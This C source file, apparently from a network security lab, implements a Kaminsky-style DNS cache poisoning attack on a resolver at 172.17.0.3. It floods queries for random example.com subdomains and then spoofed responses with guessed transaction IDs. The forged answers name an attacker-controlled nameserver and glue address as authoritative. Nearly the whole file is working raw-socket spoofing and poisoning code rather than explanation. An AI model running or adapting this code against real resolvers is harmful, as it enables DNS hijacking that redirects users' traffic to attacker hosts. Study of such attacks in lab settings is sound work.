// ----udp.c------
// This sample program must be run by root lol!
//
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap attack.c -o attack
//
//

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>

#define PCKT_LEN 8192   // 包长度
#define FLAG_R 0x8400   // DNS响应报文
#define FLAG_Q 0x0100   // DNS询问报文

const char* Fake_IP = "\1\1\1\1";
const char* Global_DNS_IP = "8.8.8.8";
const char* Local_DNS_IP = "172.17.0.3";
const char* Attacker_IP = "172.17.0.1";
const char* NS_NAME = "\2ns\014yuanzhongsheng\3net";

// Can create separate header file (.h) for all headers' structure

// The IP header's structure IP头结构体
struct ipheader {
    unsigned char iph_ihl : 4, iph_ver : 4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    // unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    unsigned int iph_sourceip;
    unsigned int iph_destip;
};

// UDP header's structure UDP头结构体
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

// DNS header's structure DNS头结构体
struct dnsheader {
    unsigned short int query_id;    //事务ID
    unsigned short int flags;       //标志位
    unsigned short int QDCOUNT;     //问题数
    unsigned short int ANCOUNT;     //回答资源记录数
    unsigned short int NSCOUNT;     //权威名称服务器数
    unsigned short int ARCOUNT;     //附加资源记录数
};

// This structure just for convinience in the DNS packet,
//because such 4 byte data often appears.
// DNS常用数据结构体
struct dataEnd {
    unsigned short int type;
    unsigned short int class;
};
// total udp header length: 8 bytes (=64 bits)

// 响应资源记录部分结构体
struct ansEnd {
    //char* name;
    unsigned short int type;    //查询类型
    //char* type;
    unsigned short int class;   //查询类
    //char* class;
    //unsigned int ttl;
    unsigned short int ttl_l;   //生存时间低位
    unsigned short int ttl_h;   //生存时间高位
    unsigned short int datalen; //资源数据长度
};

// 名称服务器部分结构体
struct nsEnd {
    //char* name;
    unsigned short int type;    //查询类型
    unsigned short int class;   //查询类
    //unsigned int ttl;
    unsigned short int ttl_l;   //生存时间低位
    unsigned short int ttl_h;   //生存时间高位
    unsigned short int datalen; //资源数据长度
    //unsigned int ns;
};


unsigned int checksum(uint16_t *usBuff, int isize) {
    unsigned int cksum = 0;
    for (; isize > 1; isize -= 2)     {
        cksum += *usBuff++;
    }
    if (isize == 1)     {
        cksum += *(uint16_t *)usBuff;
    }

    return (cksum);
}

// calculate udp checksum 计算UDP校验和
uint16_t check_udp_sum(uint8_t *buffer, int len) {
    unsigned long sum = 0;
    struct ipheader *tempI = (struct ipheader *)(buffer);
    struct udpheader *tempH = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *tempD = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    tempH->udph_chksum = 0;
    sum = checksum((uint16_t *)&(tempI->iph_sourceip), 8);
    sum += checksum((uint16_t *)tempH, len);
    sum += ntohs(IPPROTO_UDP + len);

    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords) { //
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// 构造响应包
int geneResponse(char *requestURL) {
    // 套接字描述符
    int sd;
    // 数据包的缓冲区
    char buffer[PCKT_LEN];
    // 初始化缓冲区为0
    memset(buffer, 0, PCKT_LEN);

    // 初始化包头部指针
    // IP头部指针
    struct ipheader *ip = (struct ipheader *)buffer;
    // UDP头部指针
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    // DNS头部指针
    struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    // 初始化DNS数据部分指针
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) +
                  sizeof(struct dnsheader));

    ///构造dns包
    // 设置DNS的flag位
    dns->flags = htons(FLAG_R); //响应报文
    dns->QDCOUNT = htons(1);    //问题数
    dns->ANCOUNT = htons(1);    //回答资源记录数
    dns->NSCOUNT = htons(1);    //名称服务器资源记录数
    dns->ARCOUNT = htons(1);    //附件资源记录数

    //查询部分
    strcpy(data, requestURL);   //查询的URL
    int length = strlen(data) + 1;

    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);       // A类型-域名->IP
    end->class = htons(1);      // IN类型-因特网IP地址 

    //回复资源记录部分
    char *ans = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
                 + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length);
    strcpy(ans, requestURL);    //回复的URL
    int anslength = strlen(ans) + 1;

    struct ansEnd *ansend = (struct ansEnd *)(ans + anslength);
    ansend->type = htons(1);        //A类型
    ansend->class = htons(1);       //IN类型
    ansend->ttl_l = htons(0x00);    //生存时间
    ansend->ttl_h = htons(0xFFFF);  //tll,即有效的时间
    ansend->datalen = htons(4);     //回复的内容的长度

    char *ansaddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader)
                     + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length
                     + sizeof(struct ansEnd) + anslength);
    strcpy(ansaddr, Fake_IP);   //伪造的域名对应IP
    int addrlen = strlen(ansaddr);

    //ns域名服务器资源记录部分
    char *ns = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
                + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length 
                + sizeof(struct ansEnd) + anslength + addrlen);
    //待解析的域名
    strcpy(ns, "\7example\3com");   // .example.com
    int nslength = strlen(ns) + 1;

    struct nsEnd *nsend = (struct nsEnd *)(ns + nslength);
    nsend->type = htons(2);
    nsend->class = htons(1);
    nsend->ttl_l = htons(0x00);
    nsend->ttl_h = htons(0xFFFF);   //tll,生存时间
    //数据的长度，为nsname的长度+1
    nsend->datalen = htons(23);

    char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
                    + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length 
                    + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct nsEnd)
                    + nslength);
    //伪造的权威名称服务器
    strcpy(nsname, NS_NAME); 
    int nsnamelen = strlen(nsname) + 1;

    //附加资源记录部分
    char *ar = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
                + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length 
                + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct nsEnd) 
                + nslength + nsnamelen);
    strcpy(ar, NS_NAME);   
    int arlength = strlen(ar) + 1;

    struct ansEnd *arend = (struct ansEnd *)(ar + arlength);
    arend->type = htons(1);
    arend->class = htons(1);
    arend->ttl_l = htons(0x00);
    arend->ttl_h = htons(0xFFFF);
    arend->datalen = htons(4);

    char *araddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
                    + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length 
                    + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct nsEnd) 
                    + nslength + nsnamelen + arlength + sizeof(struct ansEnd));
    //172.17.0.1
    araddr[0]='\xac',araddr[1]='\x11',araddr[2]='\0',araddr[3]='\1';
    int araddrlen = strlen(araddr)+2;


    //构造ip包

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0)
        printf("socket error\n");
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    //端口号
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    //IP地址
    sin.sin_addr.s_addr = inet_addr(Local_DNS_IP);
    //example.com的域名服务器的地址，可通过抓包获得
    din.sin_addr.s_addr = inet_addr(Global_DNS_IP); 
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0;

    unsigned short packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) 
                                    + sizeof(struct dnsheader) + length 
                                    + sizeof(struct dataEnd) + anslength 
                                    + sizeof(struct ansEnd) + nslength 
                                    + sizeof(struct nsEnd) + addrlen + nsnamelen 
                                    + arlength + sizeof(struct ansEnd) + araddrlen);
                                    // length + dataEnd_size == UDP_payload_size

    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand());
    ip->iph_ttl = 110;
    ip->iph_protocol = 17; // UDP

    // 该地值需要抓包确定
    ip->iph_sourceip = inet_addr(Global_DNS_IP);

    // 目标IP地址
    ip->iph_destip = inet_addr(Local_DNS_IP);

    // Fabricate the UDP header. Source port number, redundant
    // UDP头部, 源端口号和冗余
    // 源端口号和目的端口号
    udp->udph_srcport = htons(53); 
    udp->udph_destport = htons(33333);
    // udph_len = udp_header_size + udp_payload_size
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) 
                    + length + sizeof(struct dataEnd) + anslength + sizeof(struct ansEnd) 
                    + nslength + sizeof(struct nsEnd) + addrlen + nsnamelen + arlength 
                    + sizeof(struct ansEnd) + araddrlen); 
                    
    // Calculate the checksum for integrity//
    //计算校验和
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) 
                    + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    // Inform the kernel do not fill up the packet structure. we will build our own...
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        printf("error\n");
        exit(-1);
    }

    int count = 0;
    int trans_id = 3000;
    while (count < 100) {

        // This is to generate different query in xxxxx.example.edu
        dns->query_id = trans_id + count;   //设置DNS事务ID
        //重新计算UDP校验和
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

        //发送数据包
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        count++;
    }
    close(sd);
    return 0;
}


int main(int argc, char *argv[]) {
    // This is to check the argc number
    // 参数校验
    // if (argc != 3)  {
    //     printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first \
    //             to last:src_IP  dest_IP  \n");
    //     exit(-1);
    // }

    // socket descriptor
    //套接字描述符
    int sd;
    // buffer to hold the packet
    //报文缓冲区
    char buffer[PCKT_LEN];
    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures
    // 初始化包头部指针
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    

    //The flag you need to set
    dns->flags = htons(FLAG_Q);     // DNS询问报文
    //only 1 query, so the count should be one. 只有一条询问
    dns->QDCOUNT = htons(1);

    //query string
    strcpy(data, "\5aaaaa\7example\3com");  //aaaaa.example.com
    int length = strlen(data) + 1;

    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);

    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //

    /*************************************************************************************
	Construction of the packet is done. 
	now focus on how to do the settings and send the packet we have composed out
	***************************************************************************************/
    // Source and destination addresses: IP and port

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    // 随机生成DNS事务ID
    dns->query_id = rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if (sd < 0) // if socket fails to be created
        printf("socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses
    // src_IP
    sin.sin_addr.s_addr = inet_addr(Local_DNS_IP); // this is the second argument we input into the program
    // dest_IP
    din.sin_addr.s_addr = inet_addr(Attacker_IP); // this is the first argument we input into the program

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0;                                                                                                                                     // Low delay
    unsigned short packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) 
                                   + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110;             // hops
    ip->iph_protocol = 17;         // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(Attacker_IP);

    // The destination IP address
    ip->iph_destip = inet_addr(Local_DNS_IP);

    // Fabricate the UDP header. Source port number, redundant
    // 随机使用一个源端口号
    udp->udph_srcport = htons(40000 + rand() % 10000); // source port number, I make them random... remember the lower number may be reserved

    // Destination port number
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    /*******************************************************************************8
Tips

the checksum is quite important to pass the checking integrity. You need 
to study the algorithem and what part should be taken into the calculation.

!!!!!If you change anything related to the calculation of the checksum, you need to re-
calculate it or the packet will be dropped.!!!!!

Here things became easier since I wrote the checksum function for you. You don't need
to spend your time writing the right checksum function.
Just for knowledge purpose,
remember the seconed parameter
for UDP checksum:
ipheader_size + udpheader_size + udpData_size  
for IP checksum: 
ipheader_size + udpheader_size
*********************************************************************************/

    // Inform the kernel do not fill up the packet structure. we will build our own...
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        printf("error\n");
        exit(-1);
    }

    while (1) {
        // This is to generate different query in xxxxx.example.com
        // 对不同的xxxxx.example.com的前缀xxxxx进行随机生成
        // int charnumber;
        // charnumber = 1 + rand() % 5;
        // *(data + charnumber) += 1;
        char alpha[]="abcdefghijklmnopqrstuvwxyz";
        for(int k=1;k<=5;++k){
            data[k]=alpha[rand()%26];
        }

        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        sleep(0.9);
        //构造响应包
        geneResponse(data);
    }

    close(sd);

    return 0;
}
